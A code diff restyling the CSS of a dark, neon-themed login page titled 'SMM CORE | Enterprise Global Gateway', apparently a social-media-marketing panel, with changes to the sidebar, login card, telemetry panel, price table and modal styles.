@@ -3,34 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMM CORE | Enterprise Gateway</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <title>SMM CORE | Enterprise Global Gateway</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --ig-grad: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            --ig-grad: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
             --cyan: #00f2ff;
-            --glass: rgba(10, 12, 18, 0.95);
-            --border: rgba(255, 255, 255, 0.08);
+            --cyan-dim: rgba(0, 242, 255, 0.15);
+            --glass-bg: rgba(10, 14, 23, 0.82);
+            --sidebar-bg: #03070f;
+            --border-glow: rgba(0, 242, 255, 0.08);
+            --border-muted: rgba(255, 255, 255, 0.06);
+            --text-main: #f8fafc;
+            --text-muted: #64748b;
             --error-red: #ff3131;
-            --cyber-blue: #0072ff;
-            --sidebar-bg: rgba(3, 7, 15, 0.98);
+            --success-green: #22c55e;
+            --warning-orange: #f59e0b;
+            --card-surface: #070a12;
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; cursor: crosshair; }
-        body { background: #010409; color: white; font-family: 'Plus Jakarta Sans', sans-serif; height: 100vh; display: flex; overflow: hidden; position: relative; }
+        /* --- BASIC OVERRIDES & PREVENT ANIMATIONS ON LOAD --- */
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            cursor: crosshair;
+            font-smoothing: antialiased;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        body { 
+            background: #010409; 
+            color: var(--text-main); 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            height: 100vh; 
+            width: 100vw;
+            display: flex; 
+            overflow: hidden; 
+            position: relative; 
+        }
 
-        /* --- 1. DYNAMIC BACKGROUND LAYER (UPGRADED PRODUCTION GRID) --- */
-        #bg-canvas { position: fixed; inset: 0; z-index: -1; opacity: 0.65; }
+        /* --- BACKGROUND MATRIX AND FX --- */
+        #bg-canvas { 
+            position: fixed; 
+            inset: 0; 
+            z-index: -1; 
+            opacity: 0.75; 
+        }
         
         .vignette { 
             position: fixed; 
             inset: 0; 
             background: 
-                radial-gradient(circle at 60% 50%, transparent 10%, #010409 95%),
-                linear-gradient(rgba(0, 242, 255, 0.02) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 242, 255, 0.02) 1px, transparent 1px);
-            background-size: 100% 100%, 45px 45px, 45px 45px;
+                radial-gradient(circle at 50% 50%, transparent 20%, #010409 98%),
+                linear-gradient(rgba(0, 242, 255, 0.015) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 242, 255, 0.015) 1px, transparent 1px);
+            background-size: 100% 100%, 50px 50px, 50px 50px;
             pointer-events: none; 
             z-index: -1;
         }
@@ -39,8 +68,8 @@
             content: '';
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: repeating-linear-gradient(0deg, rgba(0, 242, 255, 0.01) 0px, rgba(0, 242, 255, 0.01) 1px, transparent 1px, transparent 3px);
-            animation: scanline 25s linear infinite;
+            background: repeating-linear-gradient(0deg, rgba(0, 242, 255, 0.008) 0px, rgba(0, 242, 255, 0.008) 1px, transparent 1px, transparent 4px);
+            animation: scanline 30s linear infinite;
             pointer-events: none;
         }
 
@@ -50,467 +79,978 @@
         }
         
         .floating-orb {
-            position: absolute; width: 450px; height: 450px; background: var(--cyan);
-            filter: blur(150px); border-radius: 50%; opacity: 0.06; 
-            animation: float-orb-smooth 25s infinite ease-in-out alternate;
-            will-change: transform; pointer-events: none;
+            position: absolute; 
+            width: 600px; 
+            height: 600px; 
+            background: var(--cyan);
+            filter: blur(180px); 
+            border-radius: 50%; 
+            opacity: 0.04; 
+            animation: float-orb-smooth 30s infinite ease-in-out alternate;
+            will-change: transform; 
+            pointer-events: none;
         }
+        
         @keyframes float-orb-smooth { 
             0% { transform: translate(0, 0) scale(1); } 
-            50% { transform: translate(120px, -60px) scale(1.15); }
-            100% { transform: translate(-30px, 90px) scale(0.95); } 
+            50% { transform: translate(150px, -80px) scale(1.1); }
+            100% { transform: translate(-50px, 100px) scale(0.9); } 
         }
 
-        /* --- 2. SYSTEM STATUS TOAST --- */
+        /* --- GLOBAL TOAST SYSTEM --- */
         #error-toast {
-            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
-            background: rgba(8, 10, 16, 0.96); border: 1px solid var(--error-red);
-            padding: 16px 32px; border-radius: 20px; backdrop-filter: blur(30px);
-            display: flex; align-items: center; gap: 15px; z-index: 2000;
-            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6), 0 0 30px rgba(255, 49, 49, 0.15);
+            position: fixed; 
+            top: -120px; 
+            left: 50%; 
+            transform: translateX(-50%);
+            background: rgba(5, 7, 12, 0.98); 
+            border: 1px solid var(--error-red);
+            padding: 18px 36px; 
+            border-radius: 16px; 
+            backdrop-filter: blur(30px);
+            display: flex; 
+            align-items: center; 
+            gap: 15px; 
+            z-index: 9999;
+            transition: top 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 40px rgba(255, 49, 49, 0.1);
         }
-        #error-toast.active { top: 40px; }
-        .error-icon { color: var(--error-red); font-size: 1.3rem; animation: glitchPulse 1s infinite alternate; }
-        @keyframes glitchPulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.08); opacity: 0.5; filter: drop-shadow(0 0 5px var(--error-red)); } }
+        #error-toast.active { 
+            top: 30px; 
+        }
+        .error-icon { 
+            color: var(--error-red); 
+            font-size: 1.4rem; 
+            animation: glitchPulse 1s infinite alternate; 
+        }
+        @keyframes glitchPulse { 
+            0% { transform: scale(1); opacity: 1; } 
+            100% { transform: scale(1.06); opacity: 0.6; filter: drop-shadow(0 0 8px var(--error-red)); } 
+        }
 
-        /* --- 3. FIX-ANCHORED ENTERPRISE SIDEBAR --- */
+        /* --- ASIDE: STATIC ANCHORED SIDEBAR (NO ANIMATION / NO SLIDE) --- */
         aside {
-            width: 320px; background: var(--sidebar-bg); backdrop-filter: blur(45px);
-            border-right: 1px solid var(--border); display: flex; flex-direction: column; 
-            padding: 2.5rem 1.5rem; z-index: 100; position: relative;
-            /* Explicitly removed slide-in animation to eliminate physical load shifting completely */
+            width: 320px; 
+            min-width: 320px;
+            background: var(--sidebar-bg); 
+            backdrop-filter: blur(40px);
+            border-right: 1px solid var(--border-muted); 
+            display: flex; 
+            flex-direction: column; 
+            padding: 2rem 1.25rem; 
+            z-index: 500; 
+            position: relative;
+            height: 100%;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 2rem;
+            padding-left: 0.5rem;
+        }
+
+        .logo-ico {
+            width: 32px;
+            height: 32px;
+            background: var(--ig-grad);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 15px rgba(220, 39, 67, 0.4);
+        }
+        
+        .logo-ico i {
+            color: white;
+            font-size: 0.95rem;
         }
 
         .logo { 
-            font-family: 'Orbitron'; font-weight: 900; font-size: 1.7rem; color: var(--cyan); 
-            margin-bottom: 2rem; letter-spacing: 3px;
-            text-shadow: 0 0 20px rgba(0, 242, 255, 0.3);
+            font-family: 'Orbitron', sans-serif; 
+            font-weight: 900; 
+            font-size: 1.4rem; 
+            color: var(--text-main); 
+            letter-spacing: 2px;
+        }
+        .logo span {
+            color: var(--cyan);
+            text-shadow: 0 0 10px rgba(0, 242, 255, 0.4);
         }
 
-        /* Live Account Matrix Module */
-        .sidebar-wallet {
+        /* Metrics Data Modules inside Sidebar */
+        .sidebar-metrics-card {
             background: rgba(255, 255, 255, 0.02);
-            border: 1px solid var(--border);
-            border-radius: 18px;
-            padding: 1.2rem;
-            margin-bottom: 1.5rem;
+            border: 1px solid var(--border-muted);
+            border-radius: 16px;
+            padding: 1.1rem;
+            margin-bottom: 1rem;
+            position: relative;
+            overflow: hidden;
         }
-        .wallet-title { font-size: 0.65rem; color: #475569; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 4px; font-weight: 700; }
-        .wallet-val { font-family: 'Orbitron'; font-weight: 700; font-size: 1.2rem; color: #22c55e; display: flex; align-items: center; gap: 8px; }
-        .wallet-val span { font-size: 0.75rem; color: #64748b; font-family: 'Plus Jakarta Sans'; font-weight: 400; }
+        .sidebar-metrics-card::before {
+            content: '';
+            position: absolute;
+            left: 0; top: 0; width: 2px; height: 100%;
+            background: var(--cyan);
+        }
+        .sidebar-metrics-card.orange::before { background: var(--warning-orange); }
         
-        .nav-label { font-size: 0.65rem; color: #475569; text-transform: uppercase; letter-spacing: 3px; margin: 1.5rem 0 0.8rem 0.5rem; font-weight: 700; }
-        nav { overflow-y: auto; flex-grow: 1; padding-right: 2px; }
-        nav::-webkit-scrollbar { width: 4px; }
-        nav::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.05); border-radius: 10px; }
+        .metric-label { 
+            font-size: 0.65rem; 
+            color: var(--text-muted); 
+            text-transform: uppercase; 
+            letter-spacing: 1.5px; 
+            margin-bottom: 6px; 
+            font-weight: 700; 
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .metric-value { 
+            font-family: 'Orbitron', sans-serif; 
+            font-weight: 700; 
+            font-size: 1.15rem; 
+            color: var(--success-green); 
+            display: flex; 
+            align-items: center; 
+            gap: 6px; 
+        }
+        .metric-value span { 
+            font-size: 0.75rem; 
+            color: var(--text-muted); 
+            font-family: 'Plus Jakarta Sans'; 
+            font-weight: 400; 
+        }
+        .metric-subtext {
+            font-size: 0.7rem;
+            color: #475569;
+            margin-top: 6px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .nav-label { 
+            font-size: 0.65rem; 
+            color: #475569; 
+            text-transform: uppercase; 
+            letter-spacing: 2.5px; 
+            margin: 1.25rem 0 0.6rem 0.5rem; 
+            font-weight: 800; 
+        }
+        
+        nav { 
+            overflow-y: auto; 
+            flex-grow: 1; 
+            padding-right: 4px; 
+        }
+        nav::-webkit-scrollbar { width: 3px; }
+        nav::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.08); border-radius: 10px; }
 
         nav a { 
-            color: #94a3b8; text-decoration: none; padding: 13px 1.2rem; border-radius: 16px;
-            display: flex; align-items: center; gap: 16px; transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1);
-            margin-bottom: 6px; font-size: 0.9rem; border: 1px solid transparent; position: relative;
+            color: #94a3b8; 
+            text-decoration: none; 
+            padding: 11px 1rem; 
+            border-radius: 12px;
+            display: flex; 
+            align-items: center; 
+            gap: 14px; 
+            transition: all 0.2s linear;
+            margin-bottom: 4px; 
+            font-size: 0.88rem; 
+            border: 1px solid transparent; 
+            position: relative;
         }
-        nav a i { transition: transform 0.3s ease; width: 18px; text-align: center; }
+        nav a i { width: 16px; text-align: center; font-size: 0.95rem; }
         nav a:hover { 
-            background: rgba(255, 255, 255, 0.03); color: white; 
-            border-color: rgba(255, 255, 255, 0.04); transform: translateX(6px);
+            background: rgba(255, 255, 255, 0.03); 
+            color: white; 
+            border-color: rgba(255, 255, 255, 0.03);
+            transform: translateX(4px);
         }
-        nav a:hover i { transform: scale(1.15); color: var(--cyan); }
+        nav a:hover i { color: var(--cyan); }
         nav a.active { 
-            background: linear-gradient(90deg, rgba(0, 242, 255, 0.07) 0%, rgba(0, 242, 255, 0) 100%); 
-            color: var(--cyan); border-color: rgba(0, 242, 255, 0.2); 
+            background: linear-gradient(90deg, rgba(0, 242, 255, 0.06) 0%, transparent 100%); 
+            color: var(--cyan); 
+            border-color: rgba(0, 242, 255, 0.15); 
             font-weight: 600;
         }
-        nav a.active::before {
-            content: ''; position: absolute; left: 0; top: 25%; height: 50%; width: 3px; 
-            background: var(--cyan); border-radius: 0 4px 4px 0; box-shadow: 0 0 10px var(--cyan);
+        nav a.active::after {
+            content: ''; position: absolute; left: 0; top: 25%; height: 50%; width: 2px; 
+            background: var(--cyan); border-radius: 0 2px 2px 0; box-shadow: 0 0 8px var(--cyan);
         }
 
-        /* --- 4. AUTH CONTAINER MODULE --- */
-        main { flex-grow: 1; display: flex; align-items: center; justify-content: center; position: relative; animation: cardFadeIn 1s cubic-bezier(0.16, 1, 0.3, 1); }
-        @keyframes cardFadeIn { from { opacity: 0; transform: scale(0.99); } to { opacity: 1; transform: scale(1); } }
+        .sidebar-footer {
+            margin-top: auto;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255,255,255,0.04);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .user-pill {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .user-avatar {
+            width: 32px; height: 32px; border-radius: 50%;
+            background: #1e293b; border: 1px solid var(--border-muted);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 0.75rem; color: #cbd5e1; font-weight: 700;
+        }
+        .user-info-text h4 { font-size: 0.8rem; font-weight: 600; color: var(--text-main); }
+        .user-info-text p { font-size: 0.65rem; color: var(--text-muted); }
 
+        /* --- MAIN WORKSPACE GRID CONFIG (NO TRANSITIONS/SLIDES ON LOAD) --- */
+        main { 
+            flex-grow: 1; 
+            display: grid;
+            grid-template-columns: 1fr 340px;
+            height: 100%;
+            position: relative; 
+            background: radial-gradient(circle at top left, rgba(0,242,255,0.01), transparent 40%);
+        }
+
+        .center-auth-zone {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            position: relative;
+            overflow-y: auto;
+        }
+
+        /* --- LOGIN CARD (NO MOVING/SLIDING CONSTRAINTS) --- */
         .login-card {
-            width: 450px; background: rgba(11, 14, 22, 0.88); border-radius: 32px; 
-            padding: 3.5rem; backdrop-filter: blur(25px);
-            position: relative; z-index: 10; border: 1px solid rgba(255, 255, 255, 0.06);
-            box-shadow: 0 50px 100px rgba(0,0,0,0.7), inset 0 1px 1px rgba(255,255,255,0.08);
-            transition: transform 0.5s cubic-bezier(0.25, 1, 0.5, 1), box-shadow 0.5s;
-        }
-        .login-card:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 60px 120px rgba(0,0,0,0.85), 0 0 40px rgba(0, 242, 255, 0.02);
+            width: 100%;
+            max-width: 460px; 
+            background: var(--card-surface); 
+            border-radius: 24px; 
+            padding: 3.5rem 3rem; 
+            backdrop-filter: blur(30px);
+            position: relative; 
+            z-index: 10; 
+            border: 1px solid var(--border-muted);
+            box-shadow: 0 40px 80px rgba(0,0,0,0.8), inset 0 1px 0px rgba(255,255,255,0.05);
         }
         
         .login-card::after {
-            content: ""; position: absolute; inset: -1px; border-radius: 32px;
-            padding: 1.5px; background: linear-gradient(135deg, #f09433, #bc1888, #00f2ff, #bc1888, #f09433);
-            background-size: 300% 300%; animation: gradientMove 6s linear infinite;
+            content: ""; position: absolute; inset: -1px; border-radius: 24px;
+            padding: 1px; background: linear-gradient(135deg, #f09433, #bc1888, #00f2ff, #bc1888, #f09433);
+            background-size: 300% 300%; animation: borderGradientMove 8s linear infinite;
             -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            mask-composite: exclude; pointer-events: none; opacity: 0.4;
+            mask-composite: exclude; pointer-events: none; opacity: 0.35;
         }
-        @keyframes gradientMove { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        @keyframes borderGradientMove { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
 
         .ig-glyph { 
-            font-size: 3.5rem; background: var(--ig-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
-            margin-bottom: 20px; text-align: center; display: block;
-            filter: drop-shadow(0 0 15px rgba(220, 39, 67, 0.15));
-            animation: glyphFloat 4s ease-in-out infinite;
+            font-size: 3.2rem; 
+            background: var(--ig-grad); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            margin-bottom: 16px; 
+            text-align: center; 
+            display: block;
+            filter: drop-shadow(0 0 12px rgba(220, 39, 67, 0.2));
         }
-        @keyframes glyphFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-6px); filter: drop-shadow(0 0 25px rgba(220, 39, 67, 0.35)); } }
 
-        .input-wrap { position: relative; margin-bottom: 1.4rem; }
-        .input-wrap i { position: absolute; left: 24px; top: 20px; color: #475569; transition: all 0.3s; font-size: 1.05rem; }
+        .input-container { 
+            position: relative; 
+            margin-bottom: 1.25rem; 
+        }
+        .input-container i { 
+            position: absolute; 
+            left: 20px; 
+            top: 18px; 
+            color: #475569; 
+            transition: color 0.2s ease; 
+            font-size: 1rem; 
+        }
         
         input[type="text"], input[type="password"] {
-            width: 100%; background: rgba(5, 8, 14, 0.95); border: 1px solid #1c2128;
-            border-radius: 20px; padding: 20px 20px 20px 64px; color: white;
-            font-size: 0.95rem; outline: none; transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            width: 100%; 
+            background: #03050a; 
+            border: 1px solid #1e293b;
+            border-radius: 14px; 
+            padding: 18px 20px 18px 56px; 
+            color: white;
+            font-size: 0.9rem; 
+            outline: none; 
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
         input:focus { 
-            border-color: #dc2743; background: #06090f; 
-            box-shadow: 0 0 25px rgba(220, 39, 67, 0.12); 
+            border-color: #cc2366; 
+            box-shadow: 0 0 20px rgba(204, 35, 102, 0.1); 
         }
-        input:focus + i { color: #dc2743; transform: scale(1.05); }
-
-        .policy-check { display: flex; align-items: flex-start; gap: 14px; margin: 1.5rem 0; cursor: pointer; font-size: 0.85rem; color: #64748b; line-height: 1.5; user-select: none; }
-        .policy-check input { display: none; }
-        .custom-box { min-width: 22px; height: 22px; border: 2px solid #1c2128; border-radius: 8px; position: relative; background: #06090f; transition: all 0.3s; }
-        .policy-check:hover .custom-box { border-color: #475569; }
-        .policy-check input:checked + .custom-box { background: var(--ig-grad); border-color: transparent; box-shadow: 0 0 15px rgba(204, 35, 102, 0.3); }
-        .policy-check input:checked + .custom-box::after { content: "\f00c"; font-family: "Font Awesome 6 Free"; font-weight: 900; position: absolute; color: white; font-size: 11px; left: 4px; top: 2px; }
-        .policy-link { color: var(--cyan); text-decoration: none; font-weight: 600; transition: all 0.3s; }
-        .policy-link:hover { text-shadow: 0 0 10px var(--cyan); color: white; }
-
-        .btn-action {
-            width: 100%; background: var(--ig-grad); color: white; border: none;
-            border-radius: 20px; padding: 20px; font-weight: 800; font-family: 'Plus Jakarta Sans';
-            cursor: pointer; text-transform: uppercase; letter-spacing: 2px;
-            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); margin-top: 5px; font-size: 0.95rem;
-            position: relative; overflow: hidden; box-shadow: 0 10px 25px rgba(220, 39, 67, 0.2);
+        input:focus + i { 
+            color: #cc2366; 
         }
-        .btn-action::before {
-            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: all 0.6s ease;
-        }
-        .btn-action:hover { 
-            transform: translateY(-2px); 
-            box-shadow: 0 20px 40px rgba(220, 39, 67, 0.4); 
-            letter-spacing: 3px; 
-        }
-        .btn-action:hover::before { left: 100%; }
 
-        /* --- MODAL SYSTEM --- */
-        .modal-overlay { position: fixed; inset: 0; background: rgba(1, 3, 6, 0.92); backdrop-filter: blur(15px); z-index: 3000; display: none; align-items: center; justify-content: center; opacity: 0; transition: opacity 0.4s ease; }
-        .modal-overlay.active { display: flex; opacity: 1; }
-        .modal-card { width: 90%; max-width: 550px; background: #0b0e16; border: 1px solid rgba(255,255,255,0.08); border-radius: 28px; padding: 3rem; position: relative; transform: scale(0.95); transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); box-shadow: 0 60px 120px rgba(0,0,0,0.9); }
-        .modal-overlay.active .modal-card { transform: scale(1); }
-        .close-modal { position: absolute; top: 24px; right: 24px; color: #475569; font-size: 1.6rem; cursor: pointer; transition: color 0.3s; }
-        .close-modal:hover { color: white; }
-        .modal-card h3 { font-family: 'Orbitron'; color: var(--cyan); margin-bottom: 1.8rem; font-size: 1.3rem; letter-spacing: 1px; }
-        .modal-card p { color: #94a3b8; font-size: 0.95rem; line-height: 1.7; margin-bottom: 1.2rem; }
+        .policy-agreement { 
+            display: flex; 
+            align-items: flex-start; 
+            gap: 12px; 
+            margin: 1.5rem 0; 
+            cursor: pointer; 
+            font-size: 0.8rem; 
+            color: var(--text-muted); 
+            line-height: 1.5; 
+            user-select: none; 
+        }
+        .policy-agreement input { display: none; }
+        .checkbox-box { 
+            min-width: 20px; 
+            height: 20px; 
+            border: 1px solid #334155; 
+            border-radius: 6px; 
+            position: relative; 
+            background: #03050a; 
+            transition: all 0.2s;
+            margin-top: 2px;
+        }
+        .policy-agreement:hover .checkbox-box { border-color: #64748b; }
+        .policy-agreement input:checked + .checkbox-box { 
+            background: var(--ig-grad); 
+            border-color: transparent; 
+            box-shadow: 0 0 12px rgba(204, 35, 102, 0.25); 
+        }
+        .policy-agreement input:checked + .checkbox-box::after { 
+            content: "\f00c"; 
+            font-family: "Font Awesome 6 Free"; 
+            font-weight: 900; 
+            position: absolute; 
+            color: white; 
+            font-size: 10px; 
+            left: 4px; 
+            top: 2px; 
+        }
+        .policy-link { color: var(--cyan); text-decoration: none; font-weight: 600; }
+        .policy-link:hover { text-shadow: 0 0 8px var(--cyan); color: white; }
 
-        /* --- LIVE TELEMETRY & NETWORK LOG STREAM --- */
-        .hud { position: absolute; left: 40px; bottom: 40px; font-family: 'Orbitron'; font-size: 0.65rem; color: #475569; line-height: 2.2; letter-spacing: 1px; z-index: 5; }
-        .status-pill { display: flex; align-items: center; gap: 8px; color: #22c55e; margin-bottom: 8px; font-weight: 700; }
-        .dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 12px #22c55e; animation: flash 1.8s infinite alternate; }
-        @keyframes flash { 0% { opacity: 0.4; } 100% { opacity: 1; } }
-        
-        /* Streaming Activity Ticker Box */
-        .stream-ticker {
-            margin-top: 10px;
-            height: 35px;
-            width: 280px;
-            overflow: hidden;
-            border-left: 2px solid #1c2128;
-            padding-left: 10px;
-            font-family: monospace;
-            color: #64748b;
+        .btn-submit {
+            width: 100%; 
+            background: var(--ig-grad); 
+            color: white; 
+            border: none;
+            border-radius: 14px; 
+            padding: 18px; 
+            font-weight: 700; 
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            cursor: pointer; 
+            text-transform: uppercase; 
+            letter-spacing: 1.5px;
+            font-size: 0.9rem;
+            box-shadow: 0 8px 20px rgba(220, 39, 67, 0.15);
+            transition: transform 0.1s, box-shadow 0.2s;
+        }
+        .btn-submit:hover { 
+            box-shadow: 0 15px 30px rgba(220, 39, 67, 0.3); 
+        }
+        .btn-submit:active {
+            transform: scale(0.99);
+        }
+
+        /* --- RIGHT-SIDE MONITORING PANEL --- */
+        .right-telemetry-panel {
+            background: rgba(2, 5, 11, 0.6);
+            border-left: 1px solid var(--border-muted);
+            backdrop-filter: blur(20px);
+            padding: 2rem 1.5rem;
             display: flex;
             flex-direction: column;
+            gap: 1.5rem;
+            overflow-y: auto;
+            position: relative;
+            z-index: 10;
         }
-        .ticker-line { animation: scrollTicker 3s infinite linear; height: 18px; white-space: nowrap; }
-        @keyframes scrollTicker {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(-18px); }
+        .panel-section-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.75rem;
+            font-weight: 700;
+            letter-spacing: 2px;
+            color: var(--cyan);
+            text-transform: uppercase;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
         }
+        .panel-section-title span {
+            width: 6px; height: 6px; background: var(--cyan); border-radius: 50%; box-shadow: 0 0 8px var(--cyan);
+        }
+
+        /* Server Grid Metrics */
+        .grid-server-status {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        .server-mini-box {
+            background: rgba(255,255,255,0.01);
+            border: 1px solid var(--border-muted);
+            border-radius: 10px;
+            padding: 10px;
+        }
+        .server-mini-box p { font-size: 0.65rem; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }
+        .server-mini-box h5 { font-family: 'Orbitron', sans-serif; font-size: 0.85rem; margin-top: 4px; color: #e2e8f0; }
+        .server-mini-box .status-indicator {
+            display: flex; align-items: center; gap: 6px; font-size: 0.7rem; margin-top: 4px; font-weight: 700;
+        }
+        .status-indicator.online { color: var(--success-green); }
+        
+        /* Node Load Bar */
+        .load-bar-container {
+            width: 100%; height: 4px; background: rgba(255,255,255,0.05); border-radius: 2px; margin-top: 6px; overflow: hidden;
+        }
+        .load-bar-fill {
+            height: 100%; background: var(--cyan); width: 42%;
+        }
+
+        /* Service Price Matrix Table Module */
+        .price-matrix-container {
+            border: 1px solid var(--border-muted);
+            border-radius: 12px;
+            overflow: hidden;
+            background: #040712;
+        }
+        .matrix-table {
+            width: 100%;
+            border-collapse: collapse;
+            text-align: left;
+            font-size: 0.75rem;
+        }
+        .matrix-table th {
+            background: rgba(255,255,255,0.02);
+            padding: 10px 12px;
+            color: var(--text-muted);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.65rem;
+            letter-spacing: 1px;
+            border-bottom: 1px solid var(--border-muted);
+        }
+        .matrix-table td {
+            padding: 10px 12px;
+            border-bottom: 1px solid rgba(255,255,255,0.02);
+            color: #cbd5e1;
+        }
+        .matrix-table tr:last-child td { border: none; }
+        .tag-speed {
+            background: rgba(34, 197, 94, 0.1);
+            color: var(--success-green);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.65rem;
+            font-weight: 700;
+        }
+
+        /* --- LOG TERMINAL MODULE --- */
+        .terminal-panel {
+            background: #020408;
+            border: 1px solid var(--border-muted);
+            border-radius: 14px;
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: #94a3b8;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            color: #475569;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            font-size: 0.65rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        .terminal-rows {
+            overflow-y: auto;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .terminal-rows::-webkit-scrollbar { width: 2px; }
+        .terminal-rows::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.05); }
+        
+        .term-row { line-height: 1.4; white-space: nowrap; }
+        .term-row span.stamp { color: #475569; margin-right: 6px; }
+        .term-row span.success { color: var(--success-green); }
+        .term-row span.warn { color: var(--warning-orange); }
+        .term-row span.info { color: var(--cyan); }
+
+        /* --- MODAL DIALOG LAYER --- */
+        .modal-overlay { 
+            position: fixed; 
+            inset: 0; 
+            background: rgba(2, 4, 8, 0.95); 
+            backdrop-filter: blur(20px); 
+            z-index: 10000; 
+            display: none; 
+            align-items: center; 
+            justify-content: center; 
+        }
+        .modal-overlay.active { 
+            display: flex; 
+        }
+        .modal-card { 
+            width: 90%; 
+            max-width: 600px; 
+            background: #060913; 
+            border: 1px solid var(--border-muted); 
+            border-radius: 24px; 
+            padding: 3rem; 
+            position: relative; 
+            box-shadow: 0 50px 100px rgba(0,0,0,0.9); 
+        }
+        .close-modal { 
+            position: absolute; 
+            top: 24px; 
+            right: 24px; 
+            color: #475569; 
+            font-size: 1.5rem; 
+            cursor: pointer; 
+            transition: color 0.2s; 
+        }
+        .close-modal:hover { color: white; }
+        .modal-card h3 { font-family: 'Orbitron', sans-serif; color: var(--cyan); margin-bottom: 1.5rem; font-size: 1.25rem; letter-spacing: 1px; }
+        .modal-body { max-height: 350px; overflow-y: auto; padding-right: 10px; }
+        .modal-body::-webkit-scrollbar { width: 3px; }
+        .modal-body::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
+        .modal-card p { color: #94a3b8; font-size: 0.88rem; line-height: 1.6; margin-bottom: 1.25rem; }
+        .modal-card strong { color: #f1f5f9; }
+
+        /* --- HEADLESS FOOTER HUD GRID --- */
+        .bottom-hud-bar {
+            position: absolute;
+            left: 40px;
+            bottom: 35px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.65rem;
+            color: #334155;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 30px;
+            z-index: 200;
+        }
+        .hud-item { display: flex; align-items: center; gap: 8px; }
+        .hud-item span.live-green { color: var(--success-green); font-weight: 700; }
+        .hud-pulse-dot { width: 6px; height: 6px; background: var(--success-green); border-radius: 50%; box-shadow: 0 0 10px var(--success-green); animation: pulseFlicker 2s infinite alternate; }
+        @keyframes pulseFlicker { 0% { opacity: 0.3; } 100% { opacity: 1; } }
 
     </style>
 </head>
 <body>
 
+    <!-- INTERACTIVE BACKGROUND CORE -->
